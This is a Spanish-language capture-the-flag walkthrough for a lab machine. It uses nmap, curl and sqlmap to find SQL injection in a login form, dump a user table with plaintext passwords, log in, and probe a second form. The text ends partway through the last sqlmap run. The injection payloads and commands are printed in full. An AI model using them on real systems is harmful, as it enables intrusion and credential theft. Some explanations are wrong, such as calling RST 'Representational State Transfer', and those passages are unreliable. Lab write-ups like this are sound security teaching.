# MIRAME (Fácil)

## 1. Empezamos por ver si hay algún Firewall activo.

Primero un escaneo Acknowledgment (Desde ahora ACK) (-sA) para enviar paquetes TCP con el flag ACK para verificar si los puertos están filtrando o no.

> ACK, en inglés Acknowledgment en español "confirmación", es cuando envío un paquete a un servidor y el servidor responde si recibe el paquete o no lo recibe.

> Los paquetes se envían como un paquete RST (rest = { en: Representational State Transfer ; es: Transferencia de estado Representacional} )

```bash
sudo nmap -sA 172.17.0.2
```

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-08 00:00 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
All 1000 scanned ports on 172.17.0.2 are in ignored states.
Not shown: 1000 unfiltered tcp ports (reset)
MAC Address: 96:2E:00:CF:2B:DB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
```

> En esta parte se nos está indicando que el host está activo, y se escanearon 1000 puertos estándar. y todos los puertos están en estado "reset" (RST), lo que nos indica que **EL SERVIDOR ESTÁ RECIBIENDO PAQUETES.**

> El estado del escaneo de los puertos es "unfiltered" lo que indica que el puerto respondió y que no hubo bloqueos, por lo que podríamos inferir que **NO HAY FIREWALL**

*El puerto puede ser escaneado y devolver filtered ó unfiltered; si el puerto responde como **filtred** indica que no hubo respuesta y está filtrando*

## 2. Escaneo de puertos y servicios

Agregamos las flags:

- -p- : Para escanear todos los puertos.
- --open : Para sólo mostrar los puertos abiertos.
- -sN : Especificar el tipo de escaneo en **TCP NULL** para no establecer conexiones completas y no usar ningún flag TCP.
- -sV : Para detecatar los servicios y las versiones que se están ejecutando en los puertos que estén abiertos.
- -vvv : Modo MUY verbose, para mostrar información de manera más detallada.
- -n : Para no traducir IPs a nombres de Host.
- -Pn : Para no hacer ping al host, lo que no comprueba si está activo.
- -oX : Me da el resultado del escaneo en un formato XML y lo dejará en el mismo directorio en el archivo tcp_ports.
  Este formato (XML) nos facilita leer los puertos desde algún sprint.py en caso de ser necesario.

```bash
sudo nmap -p- --open -sN -sV -vvv -n -Pn 172.17.0.2 -oX tcp_ports
```

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<?xml-stylesheet href="file:///usr/bin/../share/nmap/nmap.xsl" type="text/xsl"?>
<!-- Nmap 7.97 scan initiated Tue Jul  8 00:15:17 2025 as: nmap -p- -&#45;open -sN -sV -&#45;min-rate 5000 -vvv -n -Pn -oX tcp_ports 172.17.0.2 -->
<nmaprun scanner="nmap" args="nmap -p- -&#45;open -sN -sV -&#45;min-rate 5000 -vvv -n -Pn -oX tcp_ports 172.17.0.2" start="1751951717" startstr="Tue Jul  8 00:15:17 2025" version="7.97" xmloutputversion="1.05">
<scaninfo type="null" protocol="tcp" numservices="65535" services="1-65535"/>
<verbose level="3"/>
<debugging level="0"/>
<taskbegin task="ARP Ping Scan" time="1751951717"/>
<hosthint><status state="up" reason="arp-response" reason_ttl="0"/>
<address addr="172.17.0.2" addrtype="ipv4"/>
<address addr="96:2E:00:CF:2B:DB" addrtype="mac"/>
<hostnames>
</hostnames>
</hosthint>
<taskend task="ARP Ping Scan" time="1751951718" extrainfo="1 total hosts"/>
<taskbegin task="NULL Scan" time="1751951718"/>
<taskend task="NULL Scan" time="1751951718" extrainfo="65535 total ports"/>
<taskbegin task="Service scan" time="1751951718"/>
<taskend task="Service scan" time="1751951724" extrainfo="2 services on 1 host"/>
<taskbegin task="NSE" time="1751951724"/>
<taskend task="NSE" time="1751951724"/>
<taskbegin task="NSE" time="1751951724"/>
<taskend task="NSE" time="1751951724"/>
<host starttime="1751951718" endtime="1751951724"><status state="up" reason="arp-response" reason_ttl="0"/>
<address addr="172.17.0.2" addrtype="ipv4"/>
<address addr="96:2E:00:CF:2B:DB" addrtype="mac"/>
<hostnames>
</hostnames>
<ports><extraports state="closed" count="65533">
<extrareasons reason="reset" count="65533" proto="tcp" ports="1-21,23-79,81-65535"/>
</extraports>
<port protocol="tcp" portid="22"><state state="open" reason="tcp-response" reason_ttl="0"/><service name="ssh" product="OpenSSH" version="9.2p1 Debian 2+deb12u3" extrainfo="protocol 2.0" ostype="Linux" method="probed" conf="10"><cpe>cpe:/a:openbsd:openssh:9.2p1</cpe><cpe>cpe:/o:linux:linux_kernel</cpe></service></port>
<port protocol="tcp" portid="80"><state state="open" reason="tcp-response" reason_ttl="0"/><service name="http" product="Apache httpd" version="2.4.61" extrainfo="(Debian)" method="probed" conf="10"><cpe>cpe:/a:apache:http_server:2.4.61</cpe></service></port>
</ports>
<times srtt="2" rttvar="0" to="100000"/>
</host>
<runstats><finished time="1751951724" timestr="Tue Jul  8 00:15:24 2025" summary="Nmap done at Tue Jul  8 00:15:24 2025; 1 IP address (1 host up) scanned in 6.76 seconds" elapsed="6.76" exit="success"/><hosts up="1" down="0" total="1"/>
</runstats>
</nmaprun>

```

## 3. Escaneo de específico de puertos y servicios

Ahora quiero realizar un escaneo específico de los puertos, para hacer una detección de servicios.

- -p22,80 : Especificamos los puertos que vamos a escanear.
- -sCV: Estaopción combina 2 tipos de escaneo, C que son los scripts que trae nmap y V que es la directiva de detección de versión de servicios.
- -oN: Es para guardar los resultados en un archivo de texto llamado "targeted"

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-10 17:29 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Login Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
[2]+  Done                    code
```

##### La primera información más importante es:

`ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)`

##### Luego tenemos los puertos abiertos con protocolos de red, los servicios que se están ejecutando, la distribución para la que está consturido el paquete que está corriendo, el número de la versión del software:

- **Puerto 22/TCP (SSH):** OpenSSH 9.2p1 Debian 2+deb12u3, que utiliza el protocolo 2.0.
- **Puerto 80/TCP (HTTP):** Apache httpd 2.4.61, que se ejecuta en un sistema Debian.

## 4. Ver lo que contiene el servicio Apache

La función principal de Apache  [(apache.org/dev/)](https://www.apache.org/dev/) es servir páginas web, por lo que intentamos enviar una solicitud al servidor por ese puerte a ver qué nos entrega.

Hay que tener en cuenta que al acceder, dejamos nuestros logs de ingreso al servidor apache, por lo que me gustaría ejecutar un registro con control estricto de cabezeras, ó desde **tor**

- -X OPTIONS : Usa el método OPTIONS en lugar de enviar la petición como GET.
- -i : Para mostrar las cabeceras de la respuesta HTTP.

```bash
curl -X OPTIONS http://172.17.0.2:80 -i
```

```
HTTP/1.1 200 OK
Date: Fri, 11 Jul 2025 00:16:05 GMT
Server: Apache/2.4.61 (Debian)
Vary: Accept-Encoding
Content-Length: 2351
Content-Type: text/html; charset=UTF-8

<!-- index.php -->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fondo oscuro */
            color: #e0e0e0; /* Texto claro */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1f1f1f; /* Fondo del formulario */
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            padding: 20px;
            width: 300px;
        }
        h1 {
            color: #00aaff; /* Azul brillante */
            text-align: center;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #222;
            color: #e0e0e0;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #00aaff; /* Azul brillante */
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0088cc; /* Azul más oscuro al pasar el cursor */
        }
        .message {
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form action="auth.php" method="post">
            <label for="username">Usuario:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>
            
            <input type="submit" value="Entrar">
        </form>
        <div class="message">
            <!-- Aquí puedes mostrar mensajes de error o éxito -->
        </div>
    </div>
</body>
</html>
```

## 5. Intento de envío de credenciales

En la respuesta el servidor nos entregó un archivo HTML que representa un componente de Login, por lo que podemos intentar algún ingreso al servicio.

- -d : Usamos este parámetro para enviar datos en el cuerpo de la solicitud.

```bash
curl -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=admin" \
  -i
```

```
HTTP/1.1 200 OK
Date: Fri, 11 Jul 2025 18:54:31 GMT
Server: Apache/2.4.61 (Debian)
Vary: Accept-Encoding
Content-Length: 1628
Content-Type: text/html; charset=UTF-8

<!-- auth.php -->

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Error</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fondo oscuro */
            color: #e0e0e0; /* Texto claro */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1f1f1f; /* Fondo del mensaje */
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            padding: 20px;
            width: 300px;
            text-align: center;
        }
        h1 {
            color: #ff5555; /* Rojo para el error */
            margin-bottom: 20px;
        }
        .message {
            background-color: #333;
            border: 1px solid #ff5555;
            border-radius: 4px;
            padding: 15px;
            color: #ff5555;
            font-size: 16px;
        }
        a {
            color: #00aaff; /* Azul para el enlace */
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Error</h1>
                    <div class="message">
                Nombre de usuario o contraseña inválidos.            </div>
                <p>Volver al <a href="index.php">inicio de sesión</a></p>
    </div>
</body>
</html>

```

> Ha devuelto otro HTML donde nos indica que las credenciales de acceso son inválidas.

## 6. Detectar si se puede hacer inyección sql

Usamos sqlmap como herramienta para detectar y explotar inyecciones SQL automáticamente.

- -u "http://172.17.0.2:80/auth.php" : URL de destino del formulario a vulnerar.
- --data="username=admin&password=admin" : Indica una petición POST con estos datos.
- --batch : Ejecuta el modo sin preguntas interactivas.
- --risk=3 : Agresividad del ataque.
- --level=5 : Profundidad del análisis.

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" --batch --risk=3 --level=5
```

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:56:49 /2025-07-11/

[13:56:49] [INFO] resuming back-end DBMS 'mysql' 
[13:56:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 5978=(SELECT (CASE WHEN (5978=5978) THEN 5978 ELSE (SELECT 4109 UNION SELECT 1844) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(3797=3797,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rgbb&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))aAGz)-- Jkyo&password=admin
---
[13:56:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:56:50] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 13:56:50 /2025-07-11/
```

Esta respuesta nos indica que:

1. La base de datos identificada es MySQL específicamente MariaDB ≥ 5.0

   ```
   [13:56:50] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   ```

2. El parámetro vulnerable es `username`, en una solicitud `POST`.

   ```
   Parameter: username (POST)
   ```

   El script prueba una condición lógica con valores constantes para confirmar ejecución condicional. Si devuelve una respuesta válida, significa que el parámetro es vulnerable.

   ```
   Payload: username=admin' AND 5978=(SELECT (CASE WHEN (5978=5978) THEN 5978 ELSE (SELECT 4109 UNION SELECT 1844) END))-- -&password=admin
   ```

   E inyecta una expresión que fuerza un error en el motor de base de datos para obtener información directa del error. Usa funciones como CONCAT y FLOOR(RAND(0)*2) para provocar colisiones.

   ```
   Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(3797=3797,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rgbb&password=admin
   ```

   Y hace una pausa de 5 segundos usando SLEEP(5) si la condición es verdadera, útil cuando no hay mensajes de error visibles pero sí se controla el tiempo de respuesta.

   ```
   Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))aAGz)-- Jkyo&password=admin
   ```

   3. Almacena la respuesta en local para su análisis posterior:

      ```
      [13:56:50] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'
      ```

## 7. Enumerar bases de datos

- --dbs : Con este parámetro enumeramos las bases de datos disponibles en el servidor una vez haya sido confirmada la inyección sql.

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" --dbs --batch
```

```
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:17:31 /2025-07-11/

[14:17:31] [INFO] resuming back-end DBMS 'mysql' 
[14:17:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 5978=(SELECT (CASE WHEN (5978=5978) THEN 5978 ELSE (SELECT 4109 UNION SELECT 1844) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(3797=3797,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rgbb&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))aAGz)-- Jkyo&password=admin
---
[14:17:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:17:31] [INFO] fetching database names
[14:17:31] [INFO] resumed: 'information_schema'
[14:17:31] [INFO] resumed: 'users'
available databases [2]:
[*] information_schema
[*] users

[14:17:31] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 14:17:31 /2025-07-11/

```

El resultado nos entrega:

- Las bases de datos disponibles:

  ```
  available databases [2]:
  [*] information_schema
  [*] users
  ```

- Los tipos de inyección encontrados

  ```
  Type: boolean-based blind
  Type: error-based
  Type: time-based blind
  ```

## 8. Obtener tablas de la base de datos

- -D users : Selecciona la base de datos llamada usuarios.
- --tables : Extrae las tablas dentro de la base de datos especificada (users).

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" -D users --tables --batch
```

```
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:21:26 /2025-07-11/

[14:21:26] [INFO] resuming back-end DBMS 'mysql' 
[14:21:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 5978=(SELECT (CASE WHEN (5978=5978) THEN 5978 ELSE (SELECT 4109 UNION SELECT 1844) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(3797=3797,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rgbb&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))aAGz)-- Jkyo&password=admin
---
[14:21:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:21:26] [INFO] fetching tables for database: 'users'
[14:21:26] [INFO] resumed: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[14:21:26] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 14:21:26 /2025-07-11/
```

Encontramos que la base de datos users contiene al menos una tabla llamada usuarios.

```
[INFO] fetching tables for database: 'users'
...
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

## 9. Obtener los datos de la tabla

- -T usuarios : Para indicar la tabla.
- --dump : Para extraer el contenido.

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" -D users -T usuarios --dump --batch
```

```bash
[*] starting @ 23:57:11 /2025-07-07/

[23:57:12] [INFO] resuming back-end DBMS 'mysql' 
[23:57:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 5978=(SELECT (CASE WHEN (5978=5978) THEN 5978 ELSE (SELECT 4109 UNION SELECT 1844) END))-- -&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x716b6b6271,(SELECT (ELT(3797=3797,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rgbb&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1468 FROM (SELECT(SLEEP(5)))aAGz)-- Jkyo&password=admin
---
[23:57:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:57:12] [INFO] fetching columns for table 'usuarios' in database 'users'
[23:57:12] [INFO] resumed: 'id'
[23:57:12] [INFO] resumed: 'int(11)'
[23:57:12] [INFO] resumed: 'username'
[23:57:12] [INFO] resumed: 'varchar(50)'
[23:57:12] [INFO] resumed: 'password'
[23:57:12] [INFO] resumed: 'varchar(255)'
[23:57:12] [INFO] fetching entries for table 'usuarios' in database 'users'
[23:57:12] [INFO] resumed: '1'
[23:57:12] [INFO] resumed: 'chocolateadministrador'
[23:57:12] [INFO] resumed: 'admin'
[23:57:12] [INFO] resumed: '2'
[23:57:12] [INFO] resumed: 'lucas'
[23:57:12] [INFO] resumed: 'lucas'
[23:57:12] [INFO] resumed: '3'
[23:57:12] [INFO] resumed: 'soyagustin123'
[23:57:12] [INFO] resumed: 'agustin'
[23:57:12] [INFO] resumed: '4'
[23:57:12] [INFO] resumed: 'directoriotravieso'
[23:57:12] [INFO] resumed: 'directorio'
Database: users
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+

[23:57:12] [INFO] table 'users.usuarios' dumped to CSV file '/home/juan/.local/share/sqlmap/output/172.17.0.2/dump/users/usuarios.csv'
[23:57:12] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 23:57:12 /2025-07-07/

```

## 10. Probar login con los usuarios obtenidos

```bash
curl -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=chocolateadministrador" \
  -i
```

```bash
HTTP/1.1 302 Found
Date: Mon, 07 Jul 2025 23:31:30 GMT
Server: Apache/2.4.61 (Debian)
Location: page.php
Content-Length: 18
Content-Type: text/html; charset=UTF-8
```

Nos indica que el usuario se puede loguear con éxito

## 11. Probamos capturar las cookies

```bash
curl -c cookies.txt -L -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=chocolateadministrador"
```

```
<!-- clima.php -->
<br />
<b>Warning</b>:  Undefined array key "city" in <b>/var/www/html/page.php</b> on line <b>9</b><br />

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clima</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fondo oscuro */
            color: #e0e0e0; /* Texto claro */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1f1f1f; /* Fondo del formulario */
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            padding: 20px;
            width: 300px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 24px);
            padding: 8px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-bottom: 10px;
            background-color: #333;
            color: #e0e0e0;
        }
        input[type="submit"] {
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            background-color: #00aaff; /* Azul para el botón */
            color: #fff;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0077cc;
        }
        .result {
            background-color: #333;
            border: 1px solid #00aaff;
            border-radius: 4px;
            padding: 10px;
            color: #00aaff;
            font-size: 16px;
        }
        .error {
            background-color: #f44336; /* Rojo para errores */
            border: 1px solid #e53935;
            border-radius: 4px;
            padding: 10px;
            color: #fff;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Consulta del Clima</h1>
        <form method="POST">
            <input type="text" name="city" placeholder="Ingrese la ciudad" value="" required>
            <input type="submit" value="Consultar">
        </form>
                    <div class="error">
                No se pudo conectar a la API. Verifica tu clave API y la conexión.            </div>
            </div>
</body>
</html>
```

> Aunque la consulta fue inválida, nos dejó en archivo page.php donde se encuentra otro input.

## 12. Probamos mandar datos en el formulario de la página interna "page.php"

```bash
curl -b cookies.txt -X POST http://172.17.0.2:80/page.php -d "city=Bogotá"
```

```
<!-- clima.php -->

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clima</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fondo oscuro */
            color: #e0e0e0; /* Texto claro */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1f1f1f; /* Fondo del formulario */
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            padding: 20px;
            width: 300px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 24px);
            padding: 8px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-bottom: 10px;
            background-color: #333;
            color: #e0e0e0;
        }
        input[type="submit"] {
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            background-color: #00aaff; /* Azul para el botón */
            color: #fff;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0077cc;
        }
        .result {
            background-color: #333;
            border: 1px solid #00aaff;
            border-radius: 4px;
            padding: 10px;
            color: #00aaff;
            font-size: 16px;
        }
        .error {
            background-color: #f44336; /* Rojo para errores */
            border: 1px solid #e53935;
            border-radius: 4px;
            padding: 10px;
            color: #fff;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Consulta del Clima</h1>
        <form method="POST">
            <input type="text" name="city" placeholder="Ingrese la ciudad" value="Bogotá" required>
            <input type="submit" value="Consultar">
        </form>
                    <div class="result">
                La temperatura en Bogotá es 17.2°C            </div>
            </div>
</body>
</html>
```

En este caso nos devolvió un resultado diferente que nos indica que hay un **BACKEND**.

```
<body>
    <div class="container">
        <h1>Consulta del Clima</h1>
        <form method="POST">
            <input type="text" name="city" placeholder="Ingrese la ciudad" value="Bogotá" required>
            <input type="submit" value="Consultar">
        </form>
                    <div class="result">
                La temperatura en Bogotá es 17.2°C            </div>
            </div>
</body>
```

## 13. Vemos si podemos vulnerar dicho input

Analizamos el parámetro "city" para detectar si hay vulnerabilidades **SQLi**.

```bash
sqlmap -u "http://172.17.0.2/page.php" --data="city=bogota" --cookie="PHPSESSID=TU_SESSION_ID" --risk=3 --level=5 --batch
```

```
      __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:25 /2025-07-11/

[14:40:25] [INFO] testing connection to the target URL
[14:40:25] [INFO] testing if the target URL content is stable
[14:40:25] [INFO] target URL content is stable
[14:40:25] [INFO] testing if POST parameter 'city' is dynamic
[14:40:26] [WARNING] POST parameter 'city' does not appear to be dynamic
[14:40:26] [WARNING] heuristic (basic) test shows that POST parameter 'city' might not be injectable
[14:40:26] [INFO] testing for SQL injection on POST parameter 'city'
[14:40:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:40:27] [WARNING] reflective value(s) found and filtering out
[14:41:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:41:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:41:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:42:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:42:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[14:42:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[14:42:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[14:42:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:43:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:43:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[14:43:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[14:43:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[14:43:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[14:44:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[14:44:44] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[14:45:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[14:45:29] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
